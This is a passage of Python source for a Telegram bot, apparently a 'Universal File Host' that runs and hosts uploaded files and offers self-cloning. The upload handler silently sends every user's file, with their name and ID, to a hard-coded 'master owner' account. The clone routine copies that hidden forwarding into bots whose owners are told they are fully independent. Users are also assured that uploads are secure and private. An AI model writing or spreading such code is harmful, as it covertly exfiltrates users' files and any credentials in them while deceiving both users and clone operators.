    welcome_msg += f"📊 Process management\n"
    welcome_msg += f"⚡ Auto dependency installation\n\n"
    welcome_msg += f"📊 YOUR STATUS:\n"
    welcome_msg += f"📁 Upload Limit: {get_user_file_limit(user_id)} files\n"
    welcome_msg += f"📄 Current Files: {get_user_file_count(user_id)} files\n"
    welcome_msg += f"👤 Account Type: {'👑 Owner (No Restrictions)' if user_id == OWNER_ID else '👑 Admin' if is_admin else '👤 User'}\n"
    if user_id == OWNER_ID:
        welcome_msg += f"🔓 Security: Bypassed for Owner\n"
    welcome_msg += f"\n"
    welcome_msg += f"💡 Quick Start: Upload any file to begin!\n"
    welcome_msg += f"🤖 Clone Feature: Use /clone to create your own bot!"

    # Create reply markup
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    if is_admin:
        for row in ADMIN_COMMAND_BUTTONS_LAYOUT_USER_SPEC:
            markup.add(*[types.KeyboardButton(text) for text in row])
    else:
        for row in COMMAND_BUTTONS_LAYOUT_USER_SPEC:
            markup.add(*[types.KeyboardButton(text) for text in row])

    safe_send_message(message.chat.id, welcome_msg, reply_markup=markup)

@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
    """Enhanced file upload handler with strict security checks"""
    user_id = message.from_user.id

    # Check if bot is locked
    if bot_locked and user_id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Please try again later.")
        return

    # Check file upload limits
    current_count = get_user_file_count(user_id)
    max_allowed = get_user_file_limit(user_id)

    if current_count >= max_allowed:
        safe_reply_to(message, f"❌ File limit reached! You can upload maximum {max_allowed} files.")
        return

    file_info = bot.get_file(message.document.file_id)
    file_name = message.document.file_name or f"file_{int(time.time())}"
    file_ext = os.path.splitext(file_name)[1].lower()

    # Check file size before download
    if message.document.file_size > 10 * 1024 * 1024:  # 10MB limit
        safe_reply_to(message, "❌ File too large! Maximum size is 10MB for security reasons.")
        return

    try:
        # Send processing message
        processing_msg = safe_reply_to(message, f"🔍 Security scanning {file_name}...")

        # Download file
        if file_info.file_path is None:
            safe_reply_to(message, "❌ File Download Failed\n\nUnable to retrieve file path")
            return
        downloaded_file = bot.download_file(file_info.file_path)

        # Save to temporary location for scanning
        user_folder = get_user_folder(user_id)
        temp_file_path = os.path.join(user_folder, f"temp_{file_name}")
        
        with open(temp_file_path, 'wb') as f:
            f.write(downloaded_file)

        # Security check for system commands and malicious patterns (BYPASS FOR OWNER)
        if user_id == OWNER_ID:
            # Owner bypass - no security checks
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                             f"👑 Owner bypass: {file_name} - No security restrictions")
            is_safe = True
            scan_result = "Owner bypass - all files allowed"
        else:
            # Regular security check for non-owners
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                             f"🛡️ Security scan: {file_name}...")

            is_safe, scan_result = check_malicious_code(temp_file_path)
            
            if not is_safe:
                # Delete the temp file immediately
                try:
                    os.remove(temp_file_path)
                except:
                    pass
                
                # Log the security violation
                logger.warning(f"SECURITY VIOLATION: User {user_id} uploaded file with system commands: {file_name} - {scan_result}")
                
                # Send security alert
                alert_msg = f"🚨 UPLOAD BLOCKED 🚨\n\n"
                alert_msg += f"❌ System Command Detected!\n"
                alert_msg += f"📄 File: {file_name}\n"
                alert_msg += f"🔍 Issue: {scan_result}\n\n"
                alert_msg += f"💡 Only system commands and malicious patterns are blocked.\n"
                alert_msg += f"Regular programming code is allowed!"
                
                safe_edit_message(processing_msg.chat.id, processing_msg.message_id, alert_msg)
                
                # Notify admins for actual security threats
                for admin_id in admin_ids:
                    try:
                        admin_alert = f"🚨 SYSTEM COMMAND DETECTED 🚨\n\n"
                        admin_alert += f"👤 User ID: {user_id}\n"
                        admin_alert += f"📄 File: {file_name}\n"
                        admin_alert += f"🔍 Command: {scan_result}\n"
                        admin_alert += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        admin_alert += f"✅ File was automatically blocked."
                        
                        bot.send_message(admin_id, admin_alert)
                    except:
                        pass
                
                return

        # If file passes security check, move to permanent location
        file_path = os.path.join(user_folder, file_name)
        try:
            shutil.move(temp_file_path, file_path)
        except:
            os.rename(temp_file_path, file_path)

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                         f"✅ Security check passed - Processing {file_name}...")

        # Add to user files list
        if user_id not in user_files:
            user_files[user_id] = []

        # Determine file type
        file_type = 'executable' if file_ext in {'.py', '.js', '.java', '.cpp', '.c', '.sh', '.rb', '.go', '.rs', '.php', '.cs', '.kt', '.swift', '.dart', '.ts', '.lua', '.perl', '.scala', '.r', '.bat', '.ps1'} else 'hosted'

        # Remove old entry if exists
        user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]
        user_files[user_id].append((file_name, file_type))

        # Save to database
        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO user_files (user_id, file_name, file_type) VALUES (?, ?, ?)',
                     (user_id, file_name, file_type))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving file info: {e}")

        # Forward file to master owner only (6350914711) regardless of which bot received it
        if user_id != 6350914711:  # Only forward if uploader is not the master owner
            try:
                # Send the file to master owner with user info
                user_info = message.from_user
                user_name = user_info.first_name or "Unknown"
                username = f"@{user_info.username}" if user_info.username else "No username"
                
                # Check if this is a cloned bot
                is_cloned_bot = 'MASTER_OWNER_ID' in globals()
                
                if is_cloned_bot:
                    # From cloned bot - send to master owner only
                    forward_caption = f"🤖 File from Cloned Bot\n\n"
                    forward_caption += f"👤 From: {user_name} ({username})\n"
                    forward_caption += f"🆔 User ID: {user_id}\n"
                    forward_caption += f"📄 File: {file_name}\n"
                    forward_caption += f"📁 Type: {file_type}\n"
                    forward_caption += f"🛡️ Security: {'✅ Passed' if is_safe else '❌ Blocked'}\n"
                    forward_caption += f"🤖 Bot: @{bot.get_me().username}\n"
                    forward_caption += f"👑 Clone Owner: {OWNER_ID}\n"
                    forward_caption += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    forward_caption += f"📬 Forwarded from cloned bot to master owner."
                    
                    # Send only to master owner (6350914711)
                    with open(file_path, 'rb') as f:
                        bot.send_document(
                            6350914711,  # Master owner ID
                            f, 
                            caption=forward_caption,
                            timeout=30
                        )
                    
                    logger.info(f"File {file_name} forwarded to master owner from cloned bot")
                else:
                    # From original bot - send to master owner only
                    forward_caption = f"📨 New File Upload\n\n"
                    forward_caption += f"👤 From: {user_name} ({username})\n"
                    forward_caption += f"🆔 User ID: {user_id}\n"
                    forward_caption += f"📄 File: {file_name}\n"
                    forward_caption += f"📁 Type: {file_type}\n"
                    forward_caption += f"🛡️ Security: {'✅ Passed' if is_safe else '❌ Blocked'}\n"
                    forward_caption += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    forward_caption += f"📬 File automatically forwarded to master owner."

                    # Send only to master owner (6350914711)
                    with open(file_path, 'rb') as f:
                        bot.send_document(
                            6350914711,  # Master owner ID
                            f, 
                            caption=forward_caption,
                            timeout=30
                        )
                    
                    logger.info(f"File {file_name} forwarded to master owner from original bot")
                
            except Exception as e:
                logger.error(f"Failed to forward file to master owner: {e}")
                # Don't interrupt the upload process if forwarding fails

        # Execute or host the file (only for safe files)
        if file_type == 'executable':
            if user_id == OWNER_ID:
                # Owner gets special treatment - no additional security checks
                success_msg = f"✅ {file_name} uploaded successfully!\n\n"
                success_msg += f"👑 Owner Access: Unrestricted\n"
                success_msg += f"📁 Type: {file_type}\n"
                success_msg += f"🚀 Ready for execution\n\n"
                success_msg += f"Use 'Check Files' to manage your file."
            else:
                # Additional check before execution for regular users
                safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                                 f"🔒 Final security check before execution...")
                
                success_msg = f"✅ {file_name} uploaded securely!\n\n"
                success_msg += f"🛡️ Security: All checks passed\n"
                success_msg += f"📁 Type: {file_type}\n"
                success_msg += f"⚠️ Manual start required for security\n\n"
                success_msg += f"Use 'Check Files' to manage your file."
            
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)
        else:
            # Host non-executable files immediately
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
            
            # Get the current domain from environment or use default
            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')
            
            # Try to get the actual replit URL
            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                # Test if we can access our own health endpoint
                test_response = requests.get(f"{replit_url}/health", timeout=5)
                if test_response.status_code != 200:
                    # Fallback to .replit.app domain
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                # Use default replit.app domain
                replit_url = f"https://{domain}-{owner}.replit.app"
            
            file_url = f"{replit_url}/file/{file_hash}"
            
            success_msg = f"✅ {file_name} hosted successfully!\n\n"
            success_msg += f"📄 File: {file_name}\n"
            success_msg += f"📁 Type: {file_type}\n"
            success_msg += f"🔗 URL: {file_url}\n"
            success_msg += f"🛡️ Security: Maximum protection\n\n"
            success_msg += f"Your file is now accessible via the provided URL!"
            
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)

    except Exception as e:
        logger.error(f"File upload error: {e}")
        safe_reply_to(message, f"❌ Upload Failed\n\nError processing file: {str(e)}")
        
        # Clean up temp file if it exists
        try:
            temp_file_path = os.path.join(get_user_folder(user_id), f"temp_{file_name}")
            if os.path.exists(temp_file_path):
                os.remove(temp_file_path)
        except:
            pass

# --- Button Handlers ---
@bot.message_handler(func=lambda message: message.text == "📤 Upload File")
def upload_file_button(message):
    if bot_locked and message.from_user.id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Access denied.")
        return
    safe_reply_to(message, "🔒 Universal File Upload\n\n📁 Send me any file to upload!\n\n🌟 Supported: 30+ file types\n💻 Executable: Python, JS, Java, C/C++, Go, Rust, PHP, etc.\n📄 Hosted: Documents, Images, Videos, Archives\n\n🛡️ All uploads are secure!")

@bot.message_handler(func=lambda message: message.text == "📂 Check Files")
def check_files_button(message):
    if bot_locked and message.from_user.id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Access denied.")
        return
        
    user_id = message.from_user.id
    files = user_files.get(user_id, [])

    if not files:
        safe_reply_to(message, "📂 Your Files\n\n🔒 No files uploaded yet.\n\n💡 Upload any file type to begin!")
        return

    files_text = "🔒 Your Files:\n\n📁 Click on any file to manage it:\n\n"
    markup = types.InlineKeyboardMarkup(row_width=1)

    for i, (file_name, file_type) in enumerate(files, 1):
        if file_type == 'executable':
            is_running = is_bot_running(user_id, file_name)
            status = "🟢 Running" if is_running else "⭕ Stopped"
            icon = "🚀"
            
            # Add uptime info if running
            if is_running:
                uptime = get_script_uptime(user_id, file_name)
                if uptime:
                    status += f" (Uptime: {uptime})"
            
            files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n\n"
        else:
            status = "📁 Hosted"
            icon = "📄"
            # Generate file URL for hosted files
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
            
            # Get the current domain from environment or use default
            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')
            
            # Try different URL formats
            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                # Test if we can access our own health endpoint
                test_response = requests.get(f"{replit_url}/health", timeout=2)
                if test_response.status_code != 200:
                    # Fallback to .replit.app domain
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                # Use default replit.app domain
                replit_url = f"https://{domain}-{owner}.replit.app"
            
            file_url = f"{replit_url}/file/{file_hash}"
            files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n   🔗 Access: {file_url}\n\n"

        # Add control button for each file
        markup.add(types.InlineKeyboardButton(
            f"{icon} {file_name} - {status}", 
            callback_data=f'control_{user_id}_{file_name}'
        ))

    files_text += "⚙️ Management Options:\n• 🟢 Start/🔴 Stop executable files\n• 🗑️ Delete files\n• 📜 View execution logs\n• 🔄 Restart running files"

    safe_reply_to(message, files_text, reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "⚡ Bot Speed")
def bot_speed_button(message):
    start_time = time.time()
    msg = safe_reply_to(message, "🏃 Testing speed...")
    response_time = round((time.time() - start_time) * 1000, 2)

    speed_text = f"⚡ Universal File Host Performance:\n\n"
    speed_text += f"🚀 Response Time: {response_time}ms\n"
    speed_text += f"🔧 CPU Usage: Optimized\n"
    speed_text += f"💾 Memory: Efficient\n"
    speed_text += f"🌐 Network: High Speed\n"
    speed_text += f"🛡️ Security: Maximum\n"
    speed_text += f"📊 Files Supported: 30+ types\n\n"
    speed_text += f"✅ All systems operational!"

    safe_edit_message(msg.chat.id, msg.message_id, speed_text)

@bot.message_handler(func=lambda message: message.text == "📊 Statistics")
def statistics_button(message):
    user_id = message.from_user.id
    total_users = len(active_users)
    total_files = sum(len(files) for files in user_files.values())
    running_scripts = len(bot_scripts)

    stats_text = f"📊 Universal File Host Statistics:\n\n"
    stats_text += f"🎭 Active Users: {total_users}\n"
    stats_text += f"📁 Total Files: {total_files}\n"
    stats_text += f"🚀 Running Scripts: {running_scripts}\n"
    stats_text += f"🔧 Your Files: {get_user_file_count(user_id)}\n"
    stats_text += f"📈 Your Limit: {get_user_file_limit(user_id)}\n\n"
    stats_text += f"🔒 Features:\n"
    stats_text += f"✅ 30+ file type support\n"
    stats_text += f"✅ Multi-language execution\n"
    stats_text += f"✅ Advanced security scanning\n"
    stats_text += f"✅ Real-time monitoring\n"
    stats_text += f"✅ Secure file hosting\n"
    stats_text += f"✅ Auto dependency installation"

    safe_reply_to(message, stats_text)

@bot.message_handler(func=lambda message: message.text == "📢 Updates Channel")
def updates_channel_button(message):
    safe_reply_to(message, f"📢 Updates Channel\n\n🔗 Stay updated:\n{UPDATE_CHANNEL}\n\n📡 Get latest features and news!")

@bot.message_handler(func=lambda message: message.text == "📞 Contact Owner")
def contact_owner_button(message):
    safe_reply_to(message, f"📞 Contact Owner\n\n👤 Owner: {YOUR_USERNAME}\n🔐 Channel: {UPDATE_CHANNEL}\n\n💬 For support and inquiries!")

@bot.message_handler(commands=['clone'])
def clone_bot_command(message):
    """Allow users to clone the bot with their own token - FIXED WORKING VERSION"""
    user_id = message.from_user.id
    
    clone_text = f"🤖 Bot Cloning Service\n\n"
    clone_text += f"📋 Steps to clone this bot:\n\n"
    clone_text += f"1️⃣ Create a bot with @BotFather\n"
    clone_text += f"2️⃣ Get your bot token\n"
    clone_text += f"3️⃣ Use command: `/settoken YOUR_BOT_TOKEN`\n"
    clone_text += f"4️⃣ Your bot will be deployed automatically!\n\n"
    clone_text += f"✨ Features you'll get:\n"
    clone_text += f"• 🔐 Universal File Hosting (30+ types)\n"
    clone_text += f"• 🚀 Multi-language code execution\n"
    clone_text += f"• 🛡️ Advanced security scanning\n"
    clone_text += f"• 🌐 Real-time monitoring\n"
    clone_text += f"• 📊 Process management\n"
    clone_text += f"• ⚡ Auto dependency installation\n\n"
    clone_text += f"🔧 Management Commands:\n"
    clone_text += f"• `/settoken TOKEN` - Create clone with your token\n"
    clone_text += f"• `/rmclone` - Remove your existing clone\n\n"
    clone_text += f"💡 Your bot will be completely independent!"
    
    safe_reply_to(message, clone_text)

@bot.message_handler(commands=['settoken'])
def set_bot_token(message):
    """Set user's bot token and create clone - FIXED WORKING VERSION"""
    user_id = message.from_user.id
    
    # Extract token from message
    try:
        token = message.text.split(' ', 1)[1].strip()
    except IndexError:
        safe_reply_to(message, "❌ Please provide your bot token!\n\nUsage: `/settoken YOUR_BOT_TOKEN`")
        return
    
    # Basic token validation
    if not token or len(token) < 35 or ':' not in token:
        safe_reply_to(message, "❌ Invalid bot token format!\n\nGet a valid token from @BotFather")
        return
    
    # Send processing message
    processing_msg = safe_reply_to(message, "🔄 Creating your bot clone...\n\nThis may take a moment...")
    
    try:
        # Test the token
        test_bot = telebot.TeleBot(token)
        bot_info = test_bot.get_me()
        
        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                         f"✅ Token validated!\n\nBot: @{bot_info.username}\nCreating clone...")
        
        # Create bot clone
        clone_success = create_bot_clone(user_id, token, bot_info.username)
        
        if clone_success:
            success_msg = f"🎉 Bot Clone Created Successfully!\n\n"
            success_msg += f"🤖 Bot: @{bot_info.username}\n"
            success_msg += f"👤 Owner: You ({user_id})\n"
            success_msg += f"🚀 Status: Running\n"
            success_msg += f"🔗 Features: All Universal File Host features\n\n"
            success_msg += f"✅ Your bot is now live and ready to use!\n"
            success_msg += f"💡 Start it with /start command\n"
            success_msg += f"🗑️ Use /rmclone to remove the clone"
            
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)
            
            # Notify admins about new clone
            for admin_id in admin_ids:
                try:
                    admin_msg = f"🤖 New Bot Clone Created\n\n"
                    admin_msg += f"👤 User: {user_id}\n"
                    admin_msg += f"🤖 Bot: @{bot_info.username}\n"
                    admin_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    bot.send_message(admin_id, admin_msg)
                except:
                    pass
        else:
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                             "❌ Failed to create bot clone. Please try again later.")
            
    except Exception as e:
        error_msg = f"❌ Bot Clone Failed\n\n"
        error_msg += f"Error: {str(e)}\n\n"
        error_msg += f"💡 Make sure your token is valid and try again"
        
        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, error_msg)

@bot.message_handler(commands=['rmclone'])
def remove_clone_command(message):
    """Remove user's cloned bot - FIXED WORKING VERSION"""
    user_id = message.from_user.id
    
    # Check if user has a clone
    clone_key = f"clone_{user_id}"
    clone_info = user_clones.get(user_id)
    
    if not clone_info:
        safe_reply_to(message, "❌ No cloned bot found!\n\nYou don't have any active bot clone to remove.")
        return
    
    # Send processing message
    processing_msg = safe_reply_to(message, "🔄 Removing your bot clone...\n\nStopping processes...")
    
    try:
        bot_username = clone_info.get('bot_username', 'Unknown')
        
        # Stop the cloned bot process
        if clone_info.get('process'):
            try:
                process = clone_info['process']
                process.terminate()
                process.wait(timeout=10)  # Wait up to 10 seconds
                logger.info(f"Clone process terminated for user {user_id}")
            except Exception as e:
                logger.warning(f"Error terminating clone process: {e}")
                # Try force kill if normal termination fails
                try:
                    process.kill()
                except:
                    pass
        
        # Remove from user_clones
        if user_id in user_clones:
            del user_clones[user_id]
        
        # Success message
        success_msg = f"✅ Bot Clone Removed Successfully!\n\n"
        success_msg += f"🤖 Bot: @{bot_username}\n"
        success_msg += f"👤 Owner: You ({user_id})\n"
        success_msg += f"🔴 Status: Stopped & Removed\n\n"
        success_msg += f"✅ Your cloned bot has been completely removed!\n"
        success_msg += f"💡 You can create a new clone anytime with /clone"
        
        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)
        
        # Notify admins about clone removal
        for admin_id in admin_ids:
            try:
                admin_msg = f"🗑️ Bot Clone Removed\n\n"
                admin_msg += f"👤 User: {user_id}\n"
                admin_msg += f"🤖 Bot: @{bot_username}\n"
                admin_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                bot.send_message(admin_id, admin_msg)
            except:
                pass
                
        logger.info(f"Bot clone removed successfully for user {user_id}")
        
    except Exception as e:
        error_msg = f"❌ Clone Removal Failed\n\n"
        error_msg += f"Error: {str(e)}\n\n"
        error_msg += f"💡 Some files may need manual cleanup"
        
        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, error_msg)
        logger.error(f"Error removing clone for user {user_id}: {e}")

def create_bot_clone(user_id, token, bot_username):
    """Create a bot clone with user's token - COMPLETELY FIXED VERSION"""
    try:
        # Read the current script
        current_file = __file__
        with open(current_file, 'r', encoding='utf-8') as f:
            original_code = f.read()

        # Create modified code for the clone
        # Replace token and owner ID
        modified_code = original_code.replace(
            f"TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '{TOKEN}')",
            f"TOKEN = '{token}'"
        )
        modified_code = modified_code.replace(
            f"OWNER_ID = int(os.getenv('OWNER_ID', '{OWNER_ID}'))",
            f"OWNER_ID = {user_id}"
        )
        modified_code = modified_code.replace(
            f"ADMIN_ID = int(os.getenv('ADMIN_ID', '{ADMIN_ID}'))", 
            f"ADMIN_ID = {user_id}"
        )
        modified_code = modified_code.replace(
            f"YOUR_USERNAME = os.getenv('BOT_USERNAME', '{YOUR_USERNAME}')",
            f"YOUR_USERNAME = '@{bot_username}'"
        )

        # Create clone directory
        clone_dir = os.path.join(BASE_DIR, f'clone_{user_id}')
        os.makedirs(clone_dir, exist_ok=True)

        # Save the modified clone script
        clone_file = os.path.join(clone_dir, 'bot.py')
        with open(clone_file, 'w', encoding='utf-8') as f:
            f.write(modified_code)

        # Start the cloned bot in a separate process
        clone_process = subprocess.Popen(
            [sys.executable, clone_file],
            cwd=clone_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        # Store clone info
        user_clones[user_id] = {
            'process': clone_process,
            'bot_username': bot_username,
            'clone_dir': clone_dir,
            'start_time': datetime.now()
        }

        logger.info(f"Advanced bot clone created for user {user_id}, bot @{bot_username}")
        return True

    except Exception as e:
        logger.error(f"Error creating advanced bot clone: {e}")
        return False

@bot.message_handler(func=lambda message: message.text == "💳 Subscriptions")
def subscriptions_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    subs_text = "💳 Subscription Management\n\n"
    subs_text += "📊 Commands:\n"
    subs_text += "• /addsub <user_id> <days> - Add subscription\n"
    subs_text += "• /removesub <user_id> - Remove subscription\n"
    subs_text += "• /checksub <user_id> - Check subscription status\n"
    subs_text += "• /users - List all active users\n\n"
    subs_text += "📈 Current Subscriptions:\n"

    # Add current subscriptions info
    active_subs = 0
    expired_subs = 0
    for user_id_sub, sub_info in user_subscriptions.items():
        if sub_info['expiry'] > datetime.now():
            active_subs += 1
        else:
            expired_subs += 1

    subs_text += f"🟢 Active: {active_subs} users\n"
    subs_text += f"🔴 Expired: {expired_subs} users\n"
    subs_text += f"📊 Total: {len(user_subscriptions)} users"
    
    safe_reply_to(message, subs_text)

@bot.message_handler(func=lambda message: message.text == "📢 Broadcast")
def broadcast_button(message):
    """Handle broadcast button - FIXED VERSION"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    # Set broadcast mode for this user
    broadcast_mode[user_id] = True
    
    broadcast_text = "📢 BROADCAST MESSAGE SYSTEM\n\n"
    broadcast_text += "💬 Please send your broadcast message now.\n"
    broadcast_text += f"📊 Active users: {len(active_users)}\n\n"
    broadcast_text += "📝 Your message will be sent to all active users.\n"
    broadcast_text += "❌ To cancel, send /cancel"
    
    safe_reply_to(message, broadcast_text)

@bot.message_handler(func=lambda message: message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id])
def handle_broadcast_message(message):
    """Handle broadcast message input - FIXED VERSION"""
    user_id = message.from_user.id
    
    # Check for cancel
    if message.text == '/cancel':
        broadcast_mode[user_id] = False
        safe_reply_to(message, "❌ Broadcast cancelled.")
        return
    
    # Get the broadcast message
    broadcast_content = message.text
    
    # Remove broadcast mode
    broadcast_mode[user_id] = False
    
    # Send processing message
    processing_msg = safe_reply_to(message, f"🔄 Starting broadcast to {len(active_users)} users...\n\nPlease wait...")
    
    # Broadcast to all active users
    success_count = 0
    failed_count = 0
    
    broadcast_message = f"📢 BROADCAST MESSAGE\n\n{broadcast_content}\n\n- From Bot Admin"
    
    for target_user_id in list(active_users):
        try:
            bot.send_message(target_user_id, broadcast_message)
            success_count += 1
            time.sleep(0.1)  # Small delay to avoid rate limits
        except Exception as e:
            logger.error(f"Failed to send broadcast to {target_user_id}: {e}")
            failed_count += 1
    
    # Send result
    result_msg = f"📊 BROADCAST COMPLETED\n\n"
    result_msg += f"✅ Success: {success_count} users\n"
    result_msg += f"❌ Failed: {failed_count} users\n"
    result_msg += f"📨 Total: {len(active_users)} users\n\n"
    
    if failed_count > 0:
        result_msg += f"💡 Failed sends are usually due to users blocking the bot."
    
    safe_edit_message(processing_msg.chat.id, processing_msg.message_id, result_msg)
    
    # Log the broadcast
    logger.info(f"Broadcast sent by {user_id}: {success_count} success, {failed_count} failed")

@bot.message_handler(func=lambda message: message.text == "🔒 Lock Bot")
def lock_bot_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    global bot_locked
    bot_locked = not bot_locked
    status = "🔒 LOCKED" if bot_locked else "🔓 UNLOCKED"
    
    lock_text = f"🔒 Bot Lock Status Changed\n\n"
    lock_text += f"Status: {status}\n"
    lock_text += f"Admin: {message.from_user.first_name}\n"
    lock_text += f"Time: {datetime.now().strftime('%H:%M:%S')}\n\n"
    
    if bot_locked:
        lock_text += "🚫 Non-admin users are now blocked from using the bot."
    else:
        lock_text += "✅ All users can now use the bot normally."
    
    safe_reply_to(message, lock_text)

@bot.message_handler(func=lambda message: message.text == "🟢 Running All Code")
def running_code_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    if not bot_scripts:
        safe_reply_to(message, "🟢 Running Code Monitor\n\n📊 No scripts currently running.\n\n💡 All systems idle.")
        return

    running_text = f"🟢 Running Code Monitor\n\n"
    running_text += f"📊 Active Scripts: {len(bot_scripts)}\n\n"

    for script_key, script_info in bot_scripts.items():
        user_id_script = script_info['user_id']
        file_name = script_info['file_name']
        language = script_info.get('language', 'Unknown')
        icon = script_info.get('icon', '📄')
        start_time = script_info['start_time'].strftime("%H:%M:%S")
        uptime = get_script_uptime(user_id_script, file_name) or "Unknown"
        
        running_text += f"{icon} {file_name} ({language})\n"
        running_text += f"👤 User: {user_id_script}\n"
        running_text += f"⏰ Started: {start_time}\n"
        running_text += f"⏱️ Uptime: {uptime}\n"
        running_text += f"🆔 PID: {script_info['process'].pid}\n\n"

    safe_reply_to(message, running_text)

@bot.message_handler(func=lambda message: message.text == "👑 Admin Panel")
def admin_panel_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    admin_text = f"👑 Admin Panel\n\n"
    admin_text += f"📊 System Status:\n"
    admin_text += f"• Active Users: {len(active_users)}\n"
    admin_text += f"• Total Files: {sum(len(files) for files in user_files.values())}\n"
    admin_text += f"• Running Scripts: {len(bot_scripts)}\n"
    admin_text += f"• Bot Status: {'🔒 Locked' if bot_locked else '🔓 Unlocked'}\n\n"
    admin_text += f"🛠️ Available Commands:\n"
    admin_text += f"• /addsub <user_id> <days> - Add subscription\n"
    admin_text += f"• /removesub <user_id> - Remove subscription\n"
    admin_text += f"• /checksub <user_id> - Check subscription status\n"
    admin_text += f"• /users - List all active users\n"
    admin_text += f"• /broadcast - Send broadcast message\n\n"
    admin_text += f"📈 Use the admin buttons for quick actions!"

    safe_reply_to(message, admin_text)

@bot.message_handler(func=lambda message: message.text == "🤖 Clone Bot")
def clone_bot_button(message):
    """Handle clone bot button press - FIXED WORKING VERSION"""
    clone_text = f"🤖 Universal Bot Cloning Service\n\n"
    clone_text += f"🎯 Create your own instance of this bot!\n\n"
    clone_text += f"📋 Steps to clone:\n"
    clone_text += f"1️⃣ Create a new bot with @BotFather\n"
    clone_text += f"2️⃣ Copy your bot token\n"
    clone_text += f"3️⃣ Use command: `/settoken YOUR_BOT_TOKEN`\n"
    clone_text += f"4️⃣ Your bot will be deployed automatically!\n\n"
    clone_text += f"✨ Your cloned bot will have:\n"
    clone_text += f"• 🔐 All Universal File Host features\n"
    clone_text += f"• 🚀 30+ file type support\n"
    clone_text += f"• 🛡️ Advanced security system\n"
    clone_text += f"• 🌐 Independent operation\n"
    clone_text += f"• 👑 You as the owner\n\n"
    clone_text += f"🔧 Management Commands:\n"
    clone_text += f"• `/settoken` - Create a new bot clone\n"
    clone_text += f"• `/rmclone` - Remove your bot clone\n\n"
    clone_text += f"🚀 Ready to get started? Use `/settoken YOUR_TOKEN`"
    
    safe_reply_to(message, clone_text)

# --- Inline Button Callback Handlers ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('control_'))
def handle_file_control(call):
    """Handle file control buttons (start/stop/logs/delete)"""
    try:
        parts = call.data.split('_', 2)
        if len(parts) != 3:
            bot.answer_callback_query(call.id, "❌ Invalid button data")
            return
            
        _, user_id_str, file_name = parts
        user_id = int(user_id_str)
        
        # Check if user owns this file
        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return
            
        # Get file info
        user_files_list = user_files.get(user_id, [])
        file_info = next((f for f in user_files_list if f[0] == file_name), None)
        
        if not file_info:
            bot.answer_callback_query(call.id, "❌ File not found!")
            return
            
        file_name, file_type = file_info
        
        # Create control buttons based on file type
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        if file_type == 'executable':
            is_running = is_bot_running(user_id, file_name)
            
            if is_running:
                uptime = get_script_uptime(user_id, file_name) or "Unknown"
                markup.add(
                    types.InlineKeyboardButton("🔴 Stop", callback_data=f'stop_{user_id}_{file_name}'),
                    types.InlineKeyboardButton("🔄 Restart", callback_data=f'restart_{user_id}_{file_name}')
                )
            else:
                markup.add(
                    types.InlineKeyboardButton("🟢 Start", callback_data=f'start_{user_id}_{file_name}'),
                    types.InlineKeyboardButton("📜 Logs", callback_data=f'logs_{user_id}_{file_name}')
                )
        else:
            # For hosted files, show access link
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
            
